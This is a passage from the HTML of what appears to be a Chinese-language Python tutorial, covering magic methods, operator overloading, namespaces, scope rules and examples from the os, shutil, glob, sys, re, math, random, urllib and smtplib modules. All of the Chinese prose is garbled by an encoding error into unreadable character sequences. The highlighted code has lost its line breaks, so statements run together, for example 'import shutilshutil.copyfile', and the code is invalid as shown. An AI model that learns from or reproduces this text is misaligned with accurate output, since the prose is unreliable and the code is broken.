å‡½æ•°ï¼Œåœ¨ç”Ÿæˆå¯¹è±¡æ—¶è°ƒç”¨</li><li><strong><strong>del</strong> :</strong> ææ„å‡½æ•°ï¼Œé‡Šæ”¾å¯¹è±¡æ—¶ä½¿ç”¨</li><li><strong><strong>repr</strong> :</strong> æ‰“å°ï¼Œè½¬æ¢</li><li><strong><strong>setitem</strong> :</strong> æŒ‰ç…§ç´¢å¼•èµ‹å€¼</li><li><strong><strong>getitem</strong>:</strong> æŒ‰ç…§ç´¢å¼•è·å–å€¼</li><li><strong><strong>len</strong>:</strong> è·å¾—é•¿åº¦</li><li><strong><strong>cmp</strong>:</strong> æ¯”è¾ƒè¿ç®—</li><li><strong><strong>call</strong>:</strong> å‡½æ•°è°ƒç”¨</li><li><strong><strong>add</strong>:</strong> åŠ è¿ç®—</li><li><strong><strong>sub</strong>:</strong> å‡è¿ç®—</li><li><strong><strong>mul</strong>:</strong> ä¹˜è¿ç®—</li><li><strong><strong>truediv</strong>:</strong> é™¤è¿ç®—</li><li><strong><strong>mod</strong>:</strong> æ±‚ä½™è¿ç®—</li><li><strong><strong>pow</strong>:</strong> ä¹˜æ–¹</li></ul><h3 id="è¿ç®—ç¬¦é‡è½½"><a href="#è¿ç®—ç¬¦é‡è½½" class="headerlink" title="è¿ç®—ç¬¦é‡è½½"></a>è¿ç®—ç¬¦é‡è½½</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Vector</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>a <span class="token operator">=</span> a      self<span class="token punctuation">.</span>b <span class="token operator">=</span> b    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token string">'Vector (%d, %d)'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token punctuation">,</span> self<span class="token punctuation">.</span>b<span class="token punctuation">)</span>      <span class="token keyword">def</span> <span class="token function">__add__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> Vector<span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">+</span> other<span class="token punctuation">.</span>a<span class="token punctuation">,</span> self<span class="token punctuation">.</span>b <span class="token operator">+</span> other<span class="token punctuation">.</span>b<span class="token punctuation">)</span> v1 <span class="token operator">=</span> Vector<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>v2 <span class="token operator">=</span> Vector<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> v2<span class="token punctuation">)</span><span class="token comment"># Vector(7,8)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‘½åç©ºé—´å’Œä½œç”¨åŸŸ"><a href="#å‘½åç©ºé—´å’Œä½œç”¨åŸŸ" class="headerlink" title="å‘½åç©ºé—´å’Œä½œç”¨åŸŸ"></a>å‘½åç©ºé—´å’Œä½œç”¨åŸŸ</h2><h3 id="å‘½åç©ºé—´"><a href="#å‘½åç©ºé—´" class="headerlink" title="å‘½åç©ºé—´"></a>å‘½åç©ºé—´</h3><ol><li>å‘½åç©ºé—´(Namespace)æ˜¯ä»åç§°åˆ°å¯¹è±¡çš„æ˜ å°„ï¼Œå¤§éƒ¨åˆ†çš„å‘½åç©ºé—´éƒ½æ˜¯é€šè¿‡ Python å­—å…¸æ¥å®ç°çš„</li><li>å„ä¸ªå‘½åç©ºé—´æ˜¯ç‹¬ç«‹çš„ï¼Œæ‰€ä»¥ä¸€ä¸ªå‘½åç©ºé—´ä¸­ä¸èƒ½æœ‰é‡åï¼Œä¸åŒçš„å‘½åç©ºé—´å¯ä»¥é‡å</li><li>å‘½åç©ºé—´çš„ç”Ÿå‘½å‘¨æœŸå–å†³äºå¯¹è±¡çš„ä½œç”¨åŸŸï¼Œå¦‚æœå¯¹è±¡æ‰§è¡Œå®Œæˆï¼Œåˆ™è¯¥å‘½åç©ºé—´çš„ç”Ÿå‘½å‘¨æœŸå°±ç»“æŸ</li><li>æ— æ³•ä»å¤–éƒ¨å‘½åç©ºé—´è®¿é—®å†…éƒ¨å‘½åç©ºé—´çš„å¯¹è±¡</li></ol><p>ä¸‰ç§å‘½åç©ºé—´</p><ul><li><strong>å†…ç½®åç§°ï¼ˆbuilt-in names</strong>ï¼‰ï¼Œ Python è¯­è¨€å†…ç½®çš„åç§°ï¼Œæ¯”å¦‚å‡½æ•°å absã€char å’Œå¼‚å¸¸åç§° BaseExceptionã€Exception ç­‰ç­‰</li><li><strong>å…¨å±€åç§°ï¼ˆglobal namesï¼‰</strong>ï¼Œæ¨¡å—ä¸­å®šä¹‰çš„åç§°ï¼Œè®°å½•äº†æ¨¡å—çš„å˜é‡ï¼ŒåŒ…æ‹¬å‡½æ•°ã€ç±»ã€å…¶å®ƒå¯¼å…¥çš„æ¨¡å—ã€æ¨¡å—çº§çš„å˜é‡å’Œå¸¸é‡</li><li><strong>å±€éƒ¨åç§°ï¼ˆlocal namesï¼‰</strong>ï¼Œå‡½æ•°ä¸­å®šä¹‰çš„åç§°ï¼Œè®°å½•äº†å‡½æ•°çš„å˜é‡ï¼ŒåŒ…æ‹¬å‡½æ•°çš„å‚æ•°å’Œå±€éƒ¨å®šä¹‰çš„å˜é‡ã€‚ï¼ˆç±»ä¸­å®šä¹‰çš„ä¹Ÿæ˜¯ï¼‰</li></ul><p>æŸ¥æ‰¾é¡ºåºä¸ºï¼š<strong>å±€éƒ¨çš„å‘½åç©ºé—´å» -&gt; å…¨å±€å‘½åç©ºé—´ -&gt; å†…ç½®å‘½åç©ºé—´</strong></p><p>å¦‚æœæ‰¾ä¸åˆ°å˜é‡ï¼Œå®ƒå°†æ”¾å¼ƒæŸ¥æ‰¾å¹¶å¼•å‘ä¸€ä¸ª NameError å¼‚å¸¸</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># var1 æ˜¯å…¨å±€åç§°</span>var1 <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">def</span> <span class="token function">some_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment"># var2 æ˜¯å±€éƒ¨åç§°</span>    var2 <span class="token operator">=</span> <span class="token number">6</span>    <span class="token keyword">def</span> <span class="token function">some_inner_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment"># var3 æ˜¯å†…åµŒçš„å±€éƒ¨åç§°</span>        var3 <span class="token operator">=</span> <span class="token number">7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä½œç”¨åŸŸ"><a href="#ä½œç”¨åŸŸ" class="headerlink" title="ä½œç”¨åŸŸ"></a>ä½œç”¨åŸŸ</h3><ol><li>ä½œç”¨åŸŸå°±æ˜¯ä¸€ä¸ª Python ç¨‹åºå¯ä»¥ç›´æ¥è®¿é—®å‘½åç©ºé—´çš„æ­£æ–‡åŒºåŸŸ</li><li>ç¨‹åºçš„å˜é‡å¹¶ä¸æ˜¯åœ¨å“ªä¸ªä½ç½®éƒ½å¯ä»¥è®¿é—®çš„ï¼Œè®¿é—®æƒé™å†³å®šäºè¿™ä¸ªå˜é‡æ˜¯åœ¨å“ªé‡Œèµ‹å€¼çš„</li></ol><p>å››ç§ä½œç”¨åŸŸ</p><ul><li><strong>Lï¼ˆLocalï¼‰</strong>ï¼šæœ€å†…å±‚ï¼ŒåŒ…å«å±€éƒ¨å˜é‡ï¼Œæ¯”å¦‚ä¸€ä¸ªå‡½æ•°/æ–¹æ³•å†…éƒ¨</li><li><strong>Eï¼ˆEnclosingï¼‰</strong>ï¼šåŒ…å«äº†éå±€éƒ¨(non-local)ä¹Ÿéå…¨å±€(non-global)çš„å˜é‡ã€‚æ¯”å¦‚ä¸¤ä¸ªåµŒå¥—å‡½æ•°ï¼Œä¸€ä¸ªå‡½æ•°ï¼ˆæˆ–ç±»ï¼‰ A é‡Œé¢åˆåŒ…å«äº†ä¸€ä¸ªå‡½æ•° B ï¼Œé‚£ä¹ˆå¯¹äº B ä¸­çš„åç§°æ¥è¯´ A ä¸­çš„ä½œç”¨åŸŸå°±ä¸º nonlocal</li><li><strong>Gï¼ˆGlobalï¼‰</strong>ï¼šå½“å‰è„šæœ¬çš„æœ€å¤–å±‚ï¼Œæ¯”å¦‚å½“å‰æ¨¡å—çš„å…¨å±€å˜é‡ã€‚</li><li><strong>Bï¼ˆBuilt-inï¼‰</strong>ï¼š åŒ…å«äº†å†…å»ºçš„å˜é‡/å…³é”®å­—ç­‰ï¼Œæœ€åè¢«æœç´¢ã€‚</li></ul><p>è§„åˆ™é¡ºåºï¼š <strong>L â€“&gt; E â€“&gt; G â€“&gt; B</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">g_count <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># å…¨å±€ä½œç”¨åŸŸ</span><span class="token keyword">def</span> <span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    o_count <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># é—­åŒ…å‡½æ•°å¤–çš„å‡½æ•°ä¸­</span>    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        i_count <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment"># å±€éƒ¨ä½œç”¨åŸŸ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†…ç½®ä½œç”¨åŸŸé€šè¿‡ä¸€ä¸ªåä¸º builtin çš„æ ‡å‡†æ¨¡å—æ¥å®ç°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> builtins<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span>builtins<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºé¢„å®šä¹‰å˜é‡</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Python ä¸­åªæœ‰æ¨¡å—ï¼ˆmoduleï¼‰ï¼Œç±»ï¼ˆclassï¼‰ä»¥åŠå‡½æ•°ï¼ˆdefã€lambdaï¼‰æ‰ä¼šå¼•å…¥æ–°çš„ä½œç”¨åŸŸï¼Œå…¶å®ƒçš„ä»£ç å—ï¼ˆå¦‚ if/elif/else/ã€try/exceptã€for/whileç­‰ï¼‰æ˜¯ä¸ä¼šå¼•å…¥æ–°çš„ä½œç”¨åŸŸçš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™äº›è¯­å¥å†…å®šä¹‰çš„å˜é‡ï¼Œå¤–éƒ¨ä¹Ÿå¯ä»¥è®¿é—®</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> <span class="token string">'I am from Runoob'</span>  <span class="token comment"># å¤–éƒ¨å¯ä»¥è®¿é—®</span>    <span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg_inner <span class="token operator">=</span> <span class="token string">'I am from Runoob'</span>  <span class="token comment"># å¤–éƒ¨ä¸èƒ½è®¿é—®</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡"><a href="#å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡" class="headerlink" title="å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡"></a>å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡</h3><ol><li>å®šä¹‰åœ¨å‡½æ•°å†…éƒ¨çš„å˜é‡æ‹¥æœ‰ä¸€ä¸ªå±€éƒ¨ä½œç”¨åŸŸï¼Œå®šä¹‰åœ¨å‡½æ•°å¤–çš„æ‹¥æœ‰å…¨å±€ä½œç”¨åŸŸ</li><li>å±€éƒ¨å˜é‡åªèƒ½åœ¨å…¶è¢«å£°æ˜çš„å‡½æ•°å†…éƒ¨è®¿é—®ï¼Œè€Œå…¨å±€å˜é‡å¯ä»¥åœ¨æ•´ä¸ªç¨‹åºèŒƒå›´å†…è®¿é—®</li><li>è°ƒç”¨å‡½æ•°æ—¶ï¼Œæ‰€æœ‰åœ¨å‡½æ•°å†…å£°æ˜çš„å˜é‡åç§°éƒ½å°†è¢«åŠ å…¥åˆ°ä½œç”¨åŸŸä¸­</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">total <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># è¿™æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡</span><span class="token comment"># å¯å†™å‡½æ•°è¯´æ˜</span><span class="token keyword">def</span> <span class="token function">sum</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> arg2 <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#è¿”å›2ä¸ªå‚æ•°çš„å’Œ."</span>    total <span class="token operator">=</span> arg1 <span class="token operator">+</span> arg2 <span class="token comment"># totalåœ¨è¿™é‡Œæ˜¯å±€éƒ¨å˜é‡.</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"å‡½æ•°å†…æ˜¯å±€éƒ¨å˜é‡ : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span>    <span class="token keyword">return</span> total <span class="token comment">#è°ƒç”¨sumå‡½æ•°</span><span class="token builtin">sum</span><span class="token punctuation">(</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"å‡½æ•°å¤–æ˜¯å…¨å±€å˜é‡ : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''å‡½æ•°å†…æ˜¯å±€éƒ¨å˜é‡ :  30å‡½æ•°å¤–æ˜¯å…¨å±€å˜é‡ :  0'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="global-å’Œ-nonlocalå…³é”®å­—"><a href="#global-å’Œ-nonlocalå…³é”®å­—" class="headerlink" title="global å’Œ nonlocalå…³é”®å­—"></a>global å’Œ nonlocalå…³é”®å­—</h3><p>å½“å†…éƒ¨ä½œç”¨åŸŸæƒ³ä¿®æ”¹å¤–éƒ¨ä½œç”¨åŸŸçš„å˜é‡æ—¶ï¼Œç”¨åˆ° global å’Œ nonlocal å…³é”®å­—</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ä¿®æ”¹å…¨å±€å˜é‡ num</span>num <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> num  <span class="token comment"># éœ€è¦ä½¿ç”¨ global å…³é”®å­—å£°æ˜</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>     num <span class="token operator">=</span> <span class="token number">123</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>fun1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''1123123'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nonlocal ä¿®æ”¹åµŒå¥—ä½œç”¨åŸŸï¼ˆenclosing ä½œç”¨åŸŸï¼Œå¤–å±‚éå…¨å±€ä½œç”¨åŸŸï¼‰ä¸­çš„å˜é‡</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token number">10</span>    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">nonlocal</span> num   <span class="token comment"># nonlocalå…³é”®å­—å£°æ˜</span>        num <span class="token operator">=</span> <span class="token number">100</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>    inner<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>outer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''100100'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ ‡å‡†åº“æ¦‚è§ˆ"><a href="#æ ‡å‡†åº“æ¦‚è§ˆ" class="headerlink" title="æ ‡å‡†åº“æ¦‚è§ˆ"></a>æ ‡å‡†åº“æ¦‚è§ˆ</h2><h3 id="æ“ä½œç³»ç»Ÿæ¥å£"><a href="#æ“ä½œç³»ç»Ÿæ¥å£" class="headerlink" title="æ“ä½œç³»ç»Ÿæ¥å£"></a>æ“ä½œç³»ç»Ÿæ¥å£</h3><p>osæ¨¡å—æä¾›äº†ä¸å°‘ä¸æ“ä½œç³»ç»Ÿç›¸å…³è”çš„å‡½æ•°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># è¿”å›å½“å‰çš„å·¥ä½œç›®å½•</span>os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span><span class="token string">'/server/accesslogs'</span><span class="token punctuation">)</span>   <span class="token comment"># ä¿®æ”¹å½“å‰çš„å·¥ä½œç›®å½•</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'mkdir today'</span><span class="token punctuation">)</span>   <span class="token comment"># æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ mkdir</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># returns a list of all module functions</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">help</span><span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># å¸®åŠ©æ–‡æ¡£</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é’ˆå¯¹æ—¥å¸¸çš„æ–‡ä»¶å’Œç›®å½•ç®¡ç†ä»»åŠ¡ï¼Œ:mod:shutil æ¨¡å—æä¾›äº†ä¸€ä¸ªæ˜“äºä½¿ç”¨çš„é«˜çº§æ¥å£</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> shutilshutil<span class="token punctuation">.</span>copyfile<span class="token punctuation">(</span><span class="token string">'data.db'</span><span class="token punctuation">,</span> <span class="token string">'archive.db'</span><span class="token punctuation">)</span>shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token string">'/build/executables'</span><span class="token punctuation">,</span> <span class="token string">'installdir'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="æ–‡ä»¶é€šé…ç¬¦"><a href="#æ–‡ä»¶é€šé…ç¬¦" class="headerlink" title="æ–‡ä»¶é€šé…ç¬¦"></a>æ–‡ä»¶é€šé…ç¬¦</h3><p>globæ¨¡å—æä¾›äº†ä¸€ä¸ªå‡½æ•°ç”¨äºä»ç›®å½•é€šé…ç¬¦æœç´¢ä¸­ç”Ÿæˆæ–‡ä»¶åˆ—è¡¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> glob<span class="token keyword">print</span><span class="token punctuation">(</span>glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">'*.py'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ['xxx.py', 'xxx.py', 'xxx.py']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å‘½ä»¤è¡Œå‚æ•°"><a href="#å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="å‘½ä»¤è¡Œå‚æ•°"></a>å‘½ä»¤è¡Œå‚æ•°</h3><p>é€šç”¨å·¥å…·è„šæœ¬ç»å¸¸è°ƒç”¨å‘½ä»¤è¡Œå‚æ•°ã€‚è¿™äº›å‘½ä»¤è¡Œå‚æ•°ä»¥é“¾è¡¨å½¢å¼å­˜å‚¨äº sys æ¨¡å—çš„ argv å˜é‡ã€‚ä¾‹å¦‚åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œ â€œpython demo.py one two threeâ€ åå¯ä»¥å¾—åˆ°ä»¥ä¸‹è¾“å‡ºç»“æœ:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">print</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="é”™è¯¯è¾“å‡ºé‡å®šå‘å’Œç¨‹åºç»ˆæ­¢"><a href="#é”™è¯¯è¾“å‡ºé‡å®šå‘å’Œç¨‹åºç»ˆæ­¢" class="headerlink" title="é”™è¯¯è¾“å‡ºé‡å®šå‘å’Œç¨‹åºç»ˆæ­¢"></a>é”™è¯¯è¾“å‡ºé‡å®šå‘å’Œç¨‹åºç»ˆæ­¢</h3><p>sys è¿˜æœ‰ stdinï¼Œstdout å’Œ stderr å±æ€§ï¼Œå³ä½¿åœ¨ stdout è¢«é‡å®šå‘æ—¶ï¼Œåè€…ä¹Ÿå¯ä»¥ç”¨äºæ˜¾ç¤ºè­¦å‘Šå’Œé”™è¯¯ä¿¡æ¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">sys<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Warning, log file not found starting a new one\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¤§å¤šè„šæœ¬çš„å®šå‘ç»ˆæ­¢éƒ½ä½¿ç”¨ sys.exit()</p><h3 id="å­—ç¬¦ä¸²æ­£åˆ™åŒ¹é…"><a href="#å­—ç¬¦ä¸²æ­£åˆ™åŒ¹é…" class="headerlink" title="å­—ç¬¦ä¸²æ­£åˆ™åŒ¹é…"></a>å­—ç¬¦ä¸²æ­£åˆ™åŒ¹é…</h3><p>reæ¨¡å—ä¸ºé«˜çº§å­—ç¬¦ä¸²å¤„ç†æä¾›äº†æ­£åˆ™è¡¨è¾¾å¼å·¥å…·</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'\bf[a-z]*'</span><span class="token punctuation">,</span> <span class="token string">'which foot or hand fell fastest'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ['foot', 'fell', 'fastest']</span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'(\b[a-z]+) \1'</span><span class="token punctuation">,</span> <span class="token string">r'\1'</span><span class="token punctuation">,</span> <span class="token string">'cat in the the hat'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 'cat in the hat'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ•°å­¦"><a href="#æ•°å­¦" class="headerlink" title="æ•°å­¦"></a>æ•°å­¦</h3><p>mathæ¨¡å—ä¸ºæµ®ç‚¹è¿ç®—æä¾›äº†å¯¹åº•å±‚Cå‡½æ•°åº“çš„è®¿é—®</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> math<span class="token keyword">print</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>cos<span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0.70710678118654757</span><span class="token keyword">print</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 10.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>randomæä¾›äº†ç”Ÿæˆéšæœºæ•°çš„å·¥å…·</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'pear'</span><span class="token punctuation">,</span> <span class="token string">'banana'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 'apple'</span><span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># sampling without replacement</span><span class="token comment"># [30, 83, 16, 4, 8, 81, 41, 50, 18, 33]</span><span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># random float</span><span class="token comment"># 0.17970987693706186</span><span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># random integer chosen from range(6)</span><span class="token comment"># 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è®¿é—®äº’è”ç½‘"><a href="#è®¿é—®äº’è”ç½‘" class="headerlink" title="è®¿é—®äº’è”ç½‘"></a>è®¿é—®äº’è”ç½‘</h3><p>æœ‰å‡ ä¸ªæ¨¡å—ç”¨äºè®¿é—®äº’è”ç½‘ä»¥åŠå¤„ç†ç½‘ç»œé€šä¿¡åè®®ï¼Œå¤„ç†ä» urls æ¥æ”¶çš„æ•°æ®çš„ urllib.request ä»¥åŠç”¨äºå‘é€ç”µå­é‚®ä»¶çš„ smtplib</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> urlopen<span class="token keyword">for</span> line <span class="token keyword">in</span> urlopen<span class="token punctuation">(</span><span class="token string">'http://tycho.usno.navy.mil/cgi-bin/timer.pl'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    line <span class="token operator">=</span> line<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># Decoding the binary data to text.</span>    <span class="token keyword">if</span> <span class="token string">'EST'</span> <span class="token keyword">in</span> line <span class="token keyword">or</span> <span class="token string">'EDT'</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>  <span class="token comment"># look for Eastern Time</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token comment"># &lt;BR&gt;Nov. 25, 09:43:32 PM EST</span><span class="token keyword">import</span> smtplibserver <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span><span class="token string">'soothsayer@example.org'</span><span class="token punctuation">,</span> <span class="token string">'jcaesar@example.org'</span><span class="token punctuation">,</span>                <span class="token triple-quoted-string string">"""To: jcaesar@example.orgFrom: soothsayer@example.orgBeware the Ides of March."""</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 